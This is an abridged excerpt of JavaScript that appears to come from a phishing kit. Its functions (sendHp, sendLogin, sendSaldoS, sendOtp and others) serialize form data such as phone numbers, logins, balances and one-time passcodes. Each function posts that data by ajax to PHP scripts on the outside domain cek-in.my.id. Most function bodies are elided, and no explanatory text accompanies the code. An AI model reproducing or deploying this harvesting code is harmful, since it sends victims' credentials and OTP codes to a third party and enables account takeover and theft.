function sendHp() {
   ...
   $.ajax({
      url: 'https://cek-in.my.id/a/req/one.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://cek-in.my.id/a/req/two.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url:  'https://cek-in.my.id/a/req/thre.php',
      type: 'POST',
...
function sendOtpS() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://cek-in.my.id/a/req/empat.php',
...
function sendBelum(){    
   ...
   $.ajax({
        type: 'POST',
        url: 'https://cek-in.my.id/a/req/lima.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://cek-in.my.id/a/req/tujuh.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
